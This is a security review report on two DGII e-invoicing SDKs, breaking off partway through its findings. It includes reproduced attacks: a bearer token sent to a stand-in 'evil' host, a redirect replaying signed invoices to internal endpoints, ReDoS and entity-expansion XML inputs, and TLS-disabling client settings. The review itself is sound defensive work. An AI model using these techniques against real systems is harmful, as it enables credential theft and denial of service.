# Application Security Review (API design & defaults)

| Field | Value |
|---|---|
| Pipeline | P5 — Security, sub-pipeline **P5b** (Application Security Engineer) |
| Run | `review-board-2026-11-12` |
| Target | `packages/typescript` (`@deuriib/dgii-ecf` 0.6.1) and `packages/python` (`py-dgii-ecf` 0.7.2) at commit `8b7879a` |
| Dimension | Secure-by-default API design, defaults parity, input validation at trust boundaries, static analysis, dependency risk, exception contract, pen-test readiness |
| Out of scope by assignment | Threat-model narrative (P5a), DGII-host testing (no authorization), fixes (P10) |
| Working rules honoured | Source untouched; `dist/` from `bun run build` deleted after inspection; wheel/sdist built into `/tmp/py-dist`; no `pyproject.toml` / `package.json` / lockfile changes (`git status` clean apart from this report) |

---

## Verdict (PASS / PASS WITH FINDINGS / FAIL) + justification

**FAIL (security gate) — 3 HIGH, 9 MEDIUM, 6 LOW (18 findings). All findings are library-side and fixable in-place; none requires a protocol or schema change.**

The question this dimension asks is: *can a consumer of these SDKs write an insecure integration without noticing?* Today, yes, in five independent ways that I reproduced against the public API only:

1. `buyerHost` / `buyer_host` is interpolated into a URL with no scheme, host or origin check (`environment.ts:72`, `environment.py:83`), and the SDK then attaches `Authorization: Bearer <DGII token>` to that request (`http.ts:191`, `http.py:143`). Passing a value that came from the DGII directory — the documented way to obtain it — sends the seller's bearer token to a third-party host, in plaintext if the value says `http://`. **Verified by running.**
2. TypeScript's HTTP layer calls `fetch` with no redirect policy (`http.ts:281-285`), so a hostile receiver can answer `307` and have the SDK replay the signed invoice to an arbitrary internal URL while reporting `Ok` to the caller. **Verified by running** against a local harness.
3. `extractElementText` / `extract_element_text` use a backtracking regex (`xml.ts:17`, `_xml.py:18`) over caller-supplied XML with no size cap; a well-formed 35 KiB document made `send_electronic_document` take **8.9 s**, and the same shape at 120 KiB took **119.8 s**. Every send and every submission key goes through it. **Verified by running.**
4. The idempotency key omits the destination, and the in-memory store is per-process by default, so a second send of the same document to a *different* buyer returns the first buyer's cached `Ok` without transmitting — **verified by running** — while a real Redis-backed store (the documented production configuration) makes a failing `get()` *escape* the `Result` contract entirely (`http.ts:242`, `client.py:276`). **Verified by running** in both packages.
5. Python's `Signature(...)` and `Signature.from_p12(...)` raise, while their TypeScript twins return `Err`; the same asymmetry exists in response models (TS casts `data as T`, Python validates) and in XML parsing (TS refuses `DOCTYPE`, Python expands entities). Behavioural parity is the repository's headline invariant, and every one of these gaps hides a security consequence on one side only.

None of this is a break of DGII itself, and the crash-level findings (tokens, DoS) require the consumer to wire the SDK in the natural, documented way. That is exactly why the gate fails: the safe path exists but is not the obvious one.

The core cryptographic work is **not** in question here: signing, canonicalization and money-as-string/`Decimal` are well built (see Coverage for what I checked and found sound). The gaps are all at the API surface and the transport policy.

---

## Defaults matrix — setting × TS × PY × safe? × note

Both packages agree on the majority of defaults. Where they disagree, the disagreement is itself a finding because the repository promises behavioural identity.

| Setting | TypeScript | Python | Safe? | Note |
|---|---|---|---|---|
| Base URLs | `https://ecf.dgii.gov.do`, `https://fc…`, `https://statusecf…` (`environment.ts:10-19`) | identical (`environment.py:16-23`) | ✅ | Hard-coded HTTPS; no override parameter on the constants |
| Per-attempt timeout | `15_000 ms` (`resilience.ts:33`) / `timeoutMs` on `ECF` | `15.0 s` (`resilience.py:42`) / `timeout_s` on `ECF` | ✅ | No "no timeout" path; `timeout` policy is per attempt, so worst case ≈ 3 × 15 s + backoff |
| Max attempts | `3` total (`resilience.ts:30`, `cockatiel.maxAttempts`) | `3` total (`resilience.py:39`, `stop_after_attempt`) | ✅ | Same semantics |
| Retry predicate | network/transport + 408, 429, 5xx only (`errors.ts:12`, `resilience.ts:44-63`) | same status set (`errors.py:14`), same name/message heuristic (`resilience.py:55-64`) | ✅ | Non-retryable 4xx is returned as `Err`, never thrown, so the breaker never counts a business rejection |
| Backoff | decorrelated jitter, `initialDelay 100 ms`, `maxDelay 30 s` (`resilience.ts:83-86`) | exponential, `10 ms → 1 s` cap, no jitter (`resilience.py:71-73`) | ⚠️ | Divergence only; both are bounded. Worst-case latency differs by an order of magnitude |
| Circuit breaker | `ConsecutiveBreaker(5)`, half-open `30 s` (`resilience.ts:31-32`) | `pybreaker(fail_max=5, reset_timeout=30)` (`resilience.py:65-68`) | ✅ | Same thresholds |
| Bulkhead | `bulkhead(20, queue 40)` (`resilience.ts:34-35`) | **none** (`resilience.py:69-92`) | ⚠️ | Python has no concurrency cap; a fan-out integration can exhaust sockets where TS would queue |
| Redirects | **followed** (native `fetch` default; no `redirect` option passed — `http.ts:281-285`) | **not followed** (`httpx2.Client` default) | ❌ TS | F-APPSEC-02. A `307` from a buyer host replays the invoice to any URL |
| TLS verification | on by default; silently replaceable via `fetchImpl` (`client.ts:56`, `http.ts:152`) | on by default; silently replaceable via `http_client` (`client.py:159`, `http.py:121`) | ⚠️ | F-APPSEC-10. No assertion, no doc warning |
| Proxy / `.netrc` from env | ignored (undici `fetch` does not read `HTTP_PROXY`) | **honoured** — `trust_env=True` by default; `HTTPS_PROXY` redirects traffic through `HTTPProxy` (`http.py:121`) | ⚠️ | F-APPSEC-10. Asymmetric and undocumented; the token follows the proxy |
| Idempotency store | in-memory, per process, TTL 24 h (`http.ts:20,44`, `client.ts:195`) | in-memory, per process, TTL 24 h (`http.py:32-35`, `client.py:169`) | ⚠️ | F-APPSEC-04/05/09. Unsafe for multi-worker/multi-instance deployments; docs do say to back it with Redis/Postgres (`docs/en/guides/resilience.md:53-59,95`) — which is the configuration where F-APPSEC-05/09 bite |
| Single-flight per key | yes, `inFlight` map (`client.ts:263-277`) | **no** | ⚠️ | F-APPSEC-09. 16 concurrent callers: TS → 1 POST, 16 `Ok`; PY → 1 POST, 15 `IDEMPOTENCY` errors |
| Pre-flight schema validation | `false` (`client.ts:192`) | `false` (`client.py:173`) | ⚠️ | F-APPSEC-12. The schemas ship in both artifacts but the gate is opt-in |
| B2B applicability rules | `true` (`client.ts:191`) | `true` (`client.py:172`) | ✅ | Fail-closed default; documented escape hatch |
| Token refresh skew | 5 min (`client.ts:188`) | 5 min (`client.py:160`) | ✅ | Refresh is coalesced in both (`client.ts:298-309`, `client.py:204-215`) |
| Status-service auth | `Apikey` header, `omitAuth` (`client.ts:401-410`) | same (`client.py:672-687`) | ✅ | Bearer token never sent to the status host |
| Error-message whitespace | collapsed (`errors.ts:47-48`) | collapsed (`errors.py:56-58`) | ✅ | Neutralises CRLF log-forging through a hostile response body |
| SDK logging | none (grep: no `console.*`, no `logging`) | none | ✅ | No accidental secret logging |
| Certificate expiry preflight | none | none | ❌ | F-APPSEC-06. `validateXMLCertificate` is exported but never called by the send path |

---

## Findings — table ID | Severity | CWE | Title | Package | Verified-by

| ID | Severity | CWE | Title | Package | Verified by |
|---|---|---|---|---|---|
| F-APPSEC-01 | **HIGH** | CWE-918 / CWE-522 | `buyerHost` is unvalidated and receives the DGII bearer token | TS + PY | running |
| F-APPSEC-02 | **HIGH** | CWE-918 / CWE-601 | TS follows redirects on the invoice POST; `307` replays the signed document anywhere | TS | running |
| F-APPSEC-03 | **HIGH** | CWE-1333 / CWE-400 | Quadratic regex over caller XML, no input size cap, on every send path | TS + PY | running |
| F-APPSEC-04 | MEDIUM | CWE-697 | Idempotency key omits the destination; a cached success is returned for a different buyer | TS + PY | running |
| F-APPSEC-05 | MEDIUM | CWE-391 | A failing idempotency store escapes the `Result` contract (TS rejects, PY raises) | TS + PY | running |
| F-APPSEC-06 | MEDIUM | CWE-295 | No certificate preflight: expired/not-yet-valid/mismatched certificates sign silently | TS + PY | running (PY) / reading (TS) |
| F-APPSEC-07 | MEDIUM | CWE-347 | Nothing requires the document to carry a signature or an e-NCF before transmission | TS + PY | running |
| F-APPSEC-08 | MEDIUM | CWE-611 / CWE-776 | Python expands XML entities; parser not hardened; TS refuses `DOCTYPE` (parity gap) | PY (TS diverges) | running |
| F-APPSEC-09 | MEDIUM | CWE-362 | Python check-then-set idempotency has no atomicity or single-flight | PY | running |
| F-APPSEC-10 | MEDIUM | CWE-295 / CWE-441 | TLS-off injection points undocumented; Python honours `HTTP(S)_PROXY` and `.netrc` | TS + PY | running (PY) / reading (TS) |
| F-APPSEC-11 | MEDIUM | CWE-704 | TS response models are unchecked casts; fields typed `string` arrive `undefined` | TS | running |
| F-APPSEC-12 | MEDIUM | CWE-1188 | Schema validation is opt-in even though both artifacts bundle the XSDs | TS + PY | reading |
| F-APPSEC-13 | LOW | CWE-681 | Money exposed as `number`/`float` on the public surface (`montoTotal`, FC QR helper) | TS + PY | running (PY) / reading (TS) |
| F-APPSEC-14 | LOW | CWE-393 | Python `Signature(...)` / `from_p12(...)` raise; the safe twin is the lesser-known name | PY | running |
| F-APPSEC-15 | LOW | CWE-1333 | `getXmlFromBodyResponse(body, lastTagName)` interpolates into a regex | TS + PY | reading |
| F-APPSEC-16 | LOW | CWE-116 | `xml-js` does not escape `<` in `_attributes` values → malformed XML from `Transformer` | TS | running |
| F-APPSEC-17 | LOW | CWE-20 | Reception routing bypassable: `sendSummary`/`sendElectronicDocument`/`HttpClient` skip the rule | TS + PY | running |
| F-APPSEC-18 | LOW | CWE-1395 | 20 advisories in the TS tree (3 critical, dev-only); `node-forge` advisories have no fix | TS | running |

---

## F-APPSEC-01 — `buyerHost` is unvalidated and receives the DGII bearer token

**Severity** HIGH · **CWE-918** (SSRF) + **CWE-522** (insufficiently protected credentials) · **Packages** TS + PY · **Verified by running**

**Where**

- `packages/typescript/src/environment.ts:72-75` — `buildSenderReceiverUrl(host, endpoint)` returns `` `${host.replace(/\/+$/, '')}/${endpoint}` ``; no scheme check, no host check, no allowlist.
- `packages/python/src/py_dgii_ecf/environment.py:83-85` — same, in a public export (`build_sender_receiver_url`).
- `packages/typescript/src/client.ts:545-586` (`sendElectronicDocument`), `:507-517` (`getSeed`), `:529-541` (`getAuthToken`), `:809-...` (`sendCommercialApproval`) pass `buyerHost` straight through.
- `packages/python/src/py_dgii_ecf/client.py:375-412, 294-...` — same three call sites.
- `packages/typescript/src/http.ts:191-199` (`authHeaders`) and `packages/python/src/py_dgii_ecf/http.py:143-153` (`_headers`) attach `Authorization: Bearer <token>` unless `omitAuth`/`omit_auth` is set. Only the **status** host sets it (`client.ts:401-410`, `client.py:672-687`). Every buyer-host call leaves it at `false`.

**Consumer-visible impact.** The natural B2B integration is: ask DGII for the receiver's directory entry, take `urlRecepcion`, pass it as `buyerHost` (`docs/en/guides/flow.md:294`, `project-docs/dgii-ground-truth.md:249`). The SDK then (a) posts to whatever URL landed in that field — including `http://`, i.e. plaintext, or an internal address — and (b) hands the seller's DGII access token to it.

The insecure integration a consumer writes without noticing:

```ts
// exactly what the docs suggest: buyerHost comes from the directory payload
const dir = await ecf.getCustomerDirectory(buyerRnc);
const url = dir.value[0].urlRecepcion;   // type says string; runtime value is whatever DGII/the peer put there
await ecf.sendElectronicDocument(signed, 'f.xml', url);
// wire: POST http://internal-host/fe/recepcion/api/ecf
//       Authorization: Bearer <DGII seller token>       <-- leaves the trust boundary
```

Reproduced (fake `fetchImpl`, so no network egress):

```
http://127.0.0.1:9000/evil -> Ok
   REQ http://127.0.0.1:9000/evil/fe/recepcion/api/ecf | Authorization: Bearer DGII-BEARER-SECRET
file:///etc -> Ok
   REQ file:///etc/fe/recepcion/api/ecf | Authorization: Bearer DGII-BEARER-SECRET
```

Python, same result:

```
[1] Ok(InvoiceResponse(track_id='T', ...))
    ('http://127.0.0.1:9000/evil/fe/recepcion/api/ecf', 'Bearer DGII-BEARER-SECRET')
```

Note the token is attached *before* the host authenticated anything: for a peer, the SDK has no per-host token, so the only token it can send is DGII's. `authenticate(buyerHost)` exists but only replaces the single shared token (`client.ts:349`, `client.py:320`), which then becomes the token used for DGII traffic — the same bug seen from the other side.

**Fix (both packages)**

1. Validate the host before building the URL: require `https:`, reject credentials/userinfo, reject `file:`/`data:`/`javascript:`, and reject IP literals in private/loopback/link-local ranges unless an explicit `allowPrivateNetwork` opt-in is set. Reuse the same predicate in `buildSenderReceiverUrl`/`build_sender_receiver_url` so it cannot be bypassed by calling the helper directly.
2. Do not inherit the DGII bearer token on buyer-host requests. Either key tokens per origin (`Map<origin, token>`) or set `omitAuth: true` on the peer calls and require an explicit per-host `authenticate(buyerHost)` whose token is scoped to that origin.
3. Return `Err(new DgiiError(..., { code: 'VALIDATION' }))` on a rejected host — never a throw.

**How to verify.** Re-run the probes below; the buyer-host request must carry **no** `Authorization` header from the DGII token, and a non-`https` host must produce `Err('VALIDATION')` before any socket is opened.

```bash
# TS
cd packages/typescript && bun /tmp/ts-token-probe2.ts
# PY
cd packages/python && uv run --frozen python /tmp/py-probe.py
```

---

## F-APPSEC-02 — TS follows redirects on the invoice POST; `307` replays the signed document anywhere

**Severity** HIGH · **CWE-918** + **CWE-601** · **Package** TS · **Verified by running**

**Where.** `packages/typescript/src/http.ts:281-285`:

```ts
const response = await this.fetchImpl(url, { method, headers, body: options.body, signal });
```

`redirect` is never passed, so `fetch` uses `redirect: 'follow'` (up to 20 hops, any origin). The body of a `307`/`308` is replayed. `parseResponse` (`http.ts:205-231`) then judges whatever the final hop returned, so the caller sees the *redirect target's* status, not the receiver's.

**Consumer-visible impact.** A receiver controls the response to `fe/recepcion/api/ecf`. It answers `307` to an attacker-chosen URL, the SDK re-sends the complete signed e-CF there, and the caller gets `Ok`. The consumer believes the invoice was delivered to the buyer; it was delivered to the attacker instead (and a blind-SSRF probe against internal services is included for free). This is the same failure mode as F-APPSEC-01 but reachable *without* any hostile value in `buyerHost` — a receiver that is compromised, or merely misconfigured, is enough.

Reproduced against two local servers (own harness, no third-party traffic):

```
result: Ok
HOSTILE POST /fe/recepcion/api/ecf auth=Bearer DGII-BEARER-SECRET
INTERNAL POST /admin auth=(none)          <-- signed XML replayed to an internal endpoint
```

Python does **not** follow redirects (`httpx2` default): the same harness produced `Err(HTTP)` and only the hostile hop was contacted. So this is also a parity divergence, and Python's behaviour is the safer one.

**Fix (both packages).** Pass `redirect: 'error'` (or `'manual'`, and treat 3xx as `Err`) in the `fetch` call at `http.ts:281`. Python already defaults to not following; make it explicit — `httpx2.Client(..., follow_redirects=False)` at `http.py:121` so a consumer-injected client cannot flip the default silently. Document "a 3xx from a DGII or buyer endpoint is a configuration error, not a hop".

**How to verify.** `bun /tmp/ts-redirect.ts` must print `Err` and the internal service must record zero hits.

---

## F-APPSEC-03 — Quadratic regex over caller XML, no input size cap, on every send path

**Severity** HIGH · **CWE-1333** (ReDoS) + **CWE-400** (uncontrolled resource consumption) · **Packages** TS + PY · **Verified by running**

**Where**

- `packages/typescript/src/xml.ts:17` `const ATTRIBUTE_SPAN = '(?:[^>"\']|"[^"]*"|\'[^\']*\')*'`, compiled at `:22-32`, used by `extractElementText` (`:44-56`).
- `packages/python/src/py_dgii_ecf/_xml.py:18` — identical pattern, `_element_pattern` (`:21-30`), `extract_element_text` (`:33-41`).
- Callers on the send path: `client.ts:215-236` (`buildIdempotencyKey` runs on **every** submission), `reception.ts:101` (`resolveReceptionRoute`), `reception.ts:166` (`checkB2BApplicability`), `client.ts:438-505` (`reconcileSubmission`); Python: `client.py:233-262`, `reception.py:72`, `client.py:490-560`.
- No size limit anywhere: the input is whatever string the caller supplies.

**Consumer-visible impact.** The lazy `([\s\S]*?)` group must be followed by `</eNCF>`. When the document contains many `<eNCF ` openings and no closing tag, the engine retries the opening-tag match at each `<` and rescans to end of input: O(n²). Because none of these functions validate XML first, a **well-formed** document with a text/CDATA block full of `<eNCF ` prefixes is enough.

Measured, Python, public API only:

```
well-formed,  11 KiB, no eNCF -> send_electronic_document 1.00s (Ok)
well-formed,  35 KiB, no eNCF -> send_electronic_document 8.91s (Ok)
```

and the raw extractor (`_build_idempotency_key`'s first move):

```
many-opens (120 KiB) : 119.801s
```

TypeScript, same shape through `resolveReceptionRoute`/`extractElementText`:

```
opens-2k  (12 KiB) : 0.508s
opens-5k  (29 KiB) : 3.133s
opens-10k (59 KiB) : 3.392s
```

The insecure integration: any service that accepts an e-CF from a third party (receiver side, marketplace, webhook that stores an XML body, "upload your invoice" UI) and hands it to `sendDocument`/`reconcileSubmission`. One 120 KiB request pins a worker for two minutes; a handful of concurrent requests is a full denial of service. Both calls above returned **`Ok`** as well, i.e. the SDK also transmitted a document with no e-NCF (see F-APPSEC-07).

**Fix (both packages)**

1. Cap input length at the trust boundary (`MAX_DOCUMENT_BYTES`, e.g. 2 MiB) — reject with `Err('VALIDATION')` before any regex runs.
2. Replace the backtracking pattern with a linear scan: match the opening tag with `/<(?:[\w.-]+:)?NAME(?:\s[^>]*)?>/` (**no nested quantifier**), then `indexOf` the closing tag. The attribute-span alternation is the only reason the engine can revisit positions.
3. Anchor the extraction to the parsed document where one is already available (`parseStrict` in TS, `etree` in PY) instead of scanning raw text — that also removes the duplicate-definition ambiguity in F-APPSEC-07.

**How to verify.** `cd packages/python && uv run --frozen python /tmp/py-redos6.py` must finish in single-digit milliseconds for every size, and a > 2 MiB document must return `Err('VALIDATION')`.

---

## F-APPSEC-04 — Idempotency key omits the destination; a cached success is returned for a different buyer

**Severity** MEDIUM · **CWE-697** (incorrect comparison / wrong cache key) · **Packages** TS + PY · **Verified by running**

**Where.** `client.ts:215-236` builds `` `${rnc}:${ncf}:${sha256(signedXml)}` ``; `client.py:233-249` builds the same. Neither includes `buyerHost`/`buyer_host` or the environment. `submitIdempotent` (`client.ts:238-262`) and `_submit_idempotent` (`client.py:264-292`) return the cached value on a hit.

**Consumer-visible impact.** The same signed document sent to two different receivers — a legitimate and common flow (issuer → buyer peer, then the same document to DGII or to a second receiver in a group) — is transmitted once and reported successful twice.

```
[2] requests made: 1 | r2 cached from buyer-one: true
    requests: [ "https://buyer-one.example/fe/recepcion/api/ecf | Authorization=Bearer …" ]
```

`sendElectronicDocument(xml,'f.xml','https://buyer-two.example')` returned `Ok` **without a request**. The second buyer never received the invoice, and the caller has no signal.

**Fix (both packages).** Include the destination origin (and the environment) in the key: `` `${origin}|${rnc}|${ncf}|${hash}` `` — or keep two namespaces, `dgii:` and `peer:<origin>:`. Document that the key is per destination, and that a *different* destination for the same document is a distinct submission.

**How to verify.** Repeat `bun /tmp/ts-token-probe2.ts`; step `[2]` must show two requests and the second must go to `buyer-two.example`.

---

## F-APPSEC-05 — A failing idempotency store escapes the `Result` contract

**Severity** MEDIUM · **CWE-391** (unchecked error condition) · **Packages** TS + PY · **Verified by running**

**Where.**

- `packages/typescript/src/client.ts:242` — `const cached = await this.idempotency.get<…>(key);` sits outside any `try`. `client.ts:252,255,257` (`set`/`delete`) likewise.
- `packages/python/src/py_dgii_ecf/client.py:276` — `cached = self._idempotency.get(key)`; `:287` `set`; `:289` `delete`.
- The store is a documented extension point: `http.ts:11-17` ("Provide a Redis/Postgres-backed implementation in production"), `http.py:21-30`, and `docs/en/guides/resilience.md:53-59,94-96`.

**Consumer-visible impact.** The repository's first invariant is "results, not exceptions: domain and I/O failures are returned". With a network-backed store, a Redis blip is an I/O failure — and it bypasses that invariant:

```
# TS
[C] store throws -> REJECTED the promise: redis down (consumer Result handling never runs)
# PY
[C] store raises -> EXCEPTION escapes: RuntimeError redis down
```

A consumer that wrote `const r = await ecf.sendElectronicDocument(...); if (r.isErr()) …` — the documented pattern — gets an unhandled rejection or an uncaught exception in the invoice path instead of a `DgiiError`. In an async message handler this can lose the message or crash the worker mid-batch.

**Fix (both packages).** Wrap every store interaction and normalize with the single normalizer (`toDgiiError` / `to_dgii_error`) into `Err(code: 'IDEMPOTENCY')`, preserving the pending-before-transmit ordering. Add a regression test with a store whose `get`/`set`/`delete` throw.

**How to verify.** The `[C]` probes in `/tmp/ts-probe3.ts` and `/tmp/py-probe3.py` must print `Err IDEMPOTENCY` and must not reject/raise.

---

## F-APPSEC-06 — No certificate preflight: expired, not-yet-valid or mismatched certificates sign silently

**Severity** MEDIUM · **CWE-295** (improper certificate validation) · **Packages** TS + PY · **Verified by running (PY) / reading (TS)**

**Where.**

- `packages/typescript/src/signing.ts:70-74` — the constructor stores the two PEM strings; `signXml` (`:76-133`) never looks at the certificate's dates and never checks that the key matches it. `validateXMLCertificate` exists at `:150` but is called **only from tests** (`grep` over `src/` and `test/`: the sole consumer is a test file).
- `packages/python/src/py_dgii_ecf/signing.py:62-72` — loads key and certificate, no validity or key↔cert check; `sign_xml` (`:112-148`) likewise. `validate_xml_certificate` (`:204`) is exported (`__init__.py:52,173`) and exercised only by `tests/test_signing.py:156`.
- `client.ts:318-352` / `client.py:294-331` (`authenticate`) sign the seed with whatever credentials were handed in; no preflight.

**Consumer-visible impact.** A certificate that expired last month, or a `.p12` whose key does not match its certificate, is accepted at sign time and only discovered as an opaque DGII rejection — after the e-NCF is burned. Onboarding with a certification certificate in production is a one-line mistake with a fiscal cost.

```
PY sign with EXPIRED certificate -> Ok (no warning, no error)
cert notAfter: 2024-12-12 16:03:19+00:00
```

**Fix (both packages).** In the `Signature` constructor (or a new `Signature.fromCredentials` that both `ECF` paths use), compute `notBefore`/`notAfter` and the `key.publicKey == cert.publicKey` relation, and expose `expiresAt` + `isValid(now)`. In `ECF.authenticate` and the send methods, return `Err(code: 'CERTIFICATE')` when the certificate is outside its window or the pair does not match — with an explicit `allowExpiredCertificate` opt-in for certification replays. Keep `validateXMLCertificate` for *received* documents and wire it where relevant.

**How to verify.** `uv run --frozen python /tmp/py-probe5.py` must print `Err CERTIFICATE`; the TS equivalent must do the same through `ECF.authenticate`.

---

## F-APPSEC-07 — Nothing requires the document to carry a signature or an e-NCF before transmission

**Severity** MEDIUM · **CWE-347** (improper verification of cryptographic signature) + **CWE-20** · **Packages** TS + PY · **Verified by running**

**Where.** `client.ts:545-586` and `client.py:375-412` accept any string. The only content checks are B2B applicability (only when `buyerHost` is set) and the opt-in schema validation. `buildIdempotencyKey` degrades silently: `extractElementText(signedXml,'eNCF') ?? … ?? 'unknown-ncf'` (`client.ts:223-233`, `client.py:240-247`), and `'unknown-rnc'` likewise.

**Consumer-visible impact.** An unsigned `<ECF>` is transmitted, reported `Ok`, and the caller's audit trail says "delivered":

```
[B] unsigned send -> Ok (no Signature element required)      # TS
[B] unsigned send -> Ok(InvoiceResponse(track_id='T', ...))  # PY
```

Two consequences: (a) a pipeline bug that skips `signXml` produces a document DGII rejects while the integration logs a success; (b) `unknown-ncf` in the idempotency key means the key no longer identifies the invoice, so the dedup guarantee that the docstring promises silently stops holding for malformed documents.

**Fix (both packages).** Before transmit, require a `<Signature>` with a `<SignatureValue>` and, for `ECF`, an `eNCF` matching DGII's structure; return `Err(code: 'VALIDATION')` naming the missing element. Replace the `unknown-*` fallbacks with a hard `Err` on the submission path (a key that cannot identify the document must not be used to dedupe).

**How to verify.** The `[B]` probes must print `Err VALIDATION`.

---

## F-APPSEC-08 — Python expands XML entities; parser not hardened; TS refuses `DOCTYPE` (parity gap)

**Severity** MEDIUM · **CWE-611** (XXE) + **CWE-776** (entity expansion) · **Package** PY; TS diverges safely · **Verified by running**

**Where**

- `packages/python/src/py_dgii_ecf/signing.py:115` — `etree.XMLParser(remove_blank_text=True, remove_comments=True)`: no `resolve_entities=False`, `no_network=True`, `load_dtd=False`, `huge_tree=False`.
- Identical default parser at `transformer.py:103` (`xml_to_json`) and `validation.py:108` (`validate_document`).
- TypeScript's `parseStrict` (`signing.ts:31-58`) uses `@xmldom/xmldom`, which refuses entity references outright.

**Consumer-visible impact.** Internal entity expansion is active, so what the SDK signs is not what the consumer handed it:

```
internal entity with SDK parser -> b'<ECF><RNCEmisor>EXPANDED</RNCEmisor></ECF>'
internal-entity OK len 2023 | DOCTYPE kept: False | head: …<RNCEmisor>EXPANDED</RNCEmisor>…
```

Consequences: (a) *sign-what-you-see* is broken — an invoice reviewed as one string is signed as another, and the `DOCTYPE` is dropped from the output, so the consumer cannot even see the transformation afterwards; (b) on a libxml2 older than 2.14 (no amplification limit) the same input is a billion-laughs DoS. External `SYSTEM` entities were **refused** in this build (`Entity 'xxe' not defined`), but that is a libxml2-version property, not a stated SDK guarantee. Meanwhile TS rejects the same document as `INVALID_XML`, so the two SDKs disagree on whether a document with a `DOCTYPE` is signable at all — a silent parity break on the signing path.

**Fix.** One hardened parser factory in `py_dgii_ecf` (`etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False, huge_tree=False, remove_blank_text=True, remove_comments=True)`) used by `signing.py`, `transformer.py` and `validation.py`; reject documents with a `DOCTYPE` explicitly (matching TS). Mirror the rejection message in TS so both report the same `INVALID_XML`.

**How to verify.** Re-run `/tmp/lxml-probe3.py`: every `DOCTYPE` document must return `Err(INVALID_XML)`, byte-identical in both packages.

---

## F-APPSEC-09 — Python check-then-set idempotency has no atomicity or single-flight

**Severity** MEDIUM · **CWE-362** (race condition) · **Package** PY · **Verified by running**

**Where.** `packages/python/src/py_dgii_ecf/client.py:264-292`: `get(key)` → (`None`) → `set(key, pending)` → `send()` → `set/delete`. There is no lock and no single-flight map, unlike TS (`client.ts:263-277`). `_refresh_lock` (`client.py:177`) protects only the token.

**Consumer-visible impact.** Two shapes, both reproduced:

1. **Duplicate submission window.** The gap between `get` and `set` is a full network round-trip when the store is Redis/Postgres — the configuration the docs mandate for multi-instance deployments. Two workers (or two threads) can both observe `None` and both send. That is a duplicate fiscal document for one e-NCF.
2. **Spurious failures under concurrency.** In-process, the 15 losers of the race get an error instead of the winner's answer:

```
attempt 0: threads=16 POSTs=1 Ok=1 Err=15     # Python
TS threads=16 POSTs= 1 Ok= 16                 # TypeScript: coalesced
```

A consumer with a worker pool sees 15 failures for one successful send — and if it retries those, it re-enters the same race.

**Fix.** Mirror the TS `inFlight` map in `_submit_idempotent` (`threading.Lock` + per-key `Future`/`Event`), returning the winner's `Result` to every waiter. Independently, make the store contract support an atomic `set_if_absent` (or document that `get`+`set` must be transactional in a distributed store) so the multi-instance case is safe.

**How to verify.** `uv run --frozen python /tmp/py-probe2.py` must print `POSTs=1 Ok=16` for every attempt.

---

## F-APPSEC-10 — TLS-off injection points undocumented; Python honours `HTTP(S)_PROXY` and `.netrc`

**Severity** MEDIUM · **CWE-295** + **CWE-441** (unintended proxy/intermediary) · **Packages** TS + PY · **Verified by running (PY) / reading (TS)**

**Where.**

- `packages/typescript/src/client.ts:56` (`fetchImpl?: typeof fetch`, documented "useful for tests") → `http.ts:152` (`this.fetchImpl = options.fetchImpl ?? fetch`).
- `packages/python/src/py_dgii_ecf/client.py:159` (`http_client: httpx2.Client | None = None`, no comment) → `http.py:121` (`self._client = client or httpx2.Client(timeout=options.timeout_s)`).
- `http.py:121` also inherits `httpx2`'s `trust_env=True`, which reads `HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY`/`NO_PROXY` and `.netrc`.

**Consumer-visible impact.** Both injection points can carry a client with verification disabled — `httpx2.Client(verify=False)`, or an undici `Agent({connect:{rejectUnauthorized:false}})` — and nothing in the type, the name, or the docs says "this decides whether your fiscal documents are protected in transit". For a payments-adjacent SDK, "useful for tests" is not a strong enough signal on the only TLS switch.

Python additionally routes through environment proxies while TypeScript does not:

```
trust_env default: True
transport for https: HTTPTransport HTTPProxy
proxy in pool: URL(scheme=b'http', host=b'corp-proxy.internal', port=3128, ...)
```

With `HTTPS_PROXY` set in a container image, every DGII call (token included) traverses that proxy — fine for a sanctioned corporate proxy, a silent MITM for an injected env var, and a behaviour that only one of the two SDKs exhibits. `http.ts` has no proxy support at all, so a consumer behind a mandatory proxy writes a custom `fetchImpl` and may well disable verification to make it work.

**Fix (both packages).** Rename/document the injection points as security-relevant (`transport?: HttpClientTransport — verification must stay enabled`). Add a startup assertion when a caller supplies `http_client`: `client.trust_env is False` and verification enabled, or require an explicit `allowInsecureTransport: true`. In Python, default to `httpx2.Client(timeout=..., trust_env=False)` and expose `trust_env` as an explicit option; in TS, document that proxy support requires an `undici` dispatcher and is unimplemented.

**How to verify.** `uv run --frozen python /tmp/py-proxy.py` must show `trust_env default: False` after the fix; a client with `verify=False` must make `ECF(...)` return `Err('VALIDATION')`.

---

## F-APPSEC-11 — TS response models are unchecked casts; fields typed `string` arrive `undefined`

**Severity** MEDIUM · **CWE-704** (incorrect type conversion) · **Package** TS · **Verified by running**

**Where.** `packages/typescript/src/http.ts:222` — `return ok(data as T);`. Every `ECF` read method casts the decoded JSON straight into its declared model (`client.ts:734-751` `getCustomerDirectory`, `:752-771` `getDirectoryListing`, `:773-...` `getSummaryInvoiceInquiry`, and the status methods). Python validates each field and returns `Err` (`client.py:97-160` `_parse_one`/`_parse_list`, `types.py:from_dict` + `ResponseShapeError`).

**Consumer-visible impact.** The type declares `ServiceDirectoryResponse.urlRecepcion: string` (`types.ts:105-111`); at runtime it is `undefined` when the payload omits it, and the consumer's `buyerHost` becomes `"undefined/fe/recepcion/api/ecf"` — a request to a host named `undefined`. Compare the two SDKs on the identical hostile payload:

```
[A] TS getDirectoryListing -> Ok with urlRecepcion=undefined (type says string)
[A] PY get_directory_listing -> Err(DgiiError("field 'urlRecepcion' must be a string, got NoneType"))
```

Beyond the crash, an unchecked cast is how a hostile response gets to influence control flow: any field a consumer branches on can be a different JSON type than declared.

**Fix.** Give TypeScript the same decoders Python has (hand-written `parseXResponse(value: unknown): Result<X, DgiiError>`, or the existing `isRecord` + field predicates already used at `client.ts:75-120`), and use them for every model that a consumer reads. Keep `ok(data as T)` only behind the low-level `HttpClient` where the caller explicitly asked for a cast.

**How to verify.** Port `/tmp/py-probe3.py` `[A]` to vitest; it must assert `Err('VALIDATION')`.

---

## F-APPSEC-12 — Schema validation is opt-in even though both artifacts bundle the XSDs

**Severity** MEDIUM · **CWE-1188** (initialization with an insecure default) · **Packages** TS + PY · **Verified by reading**

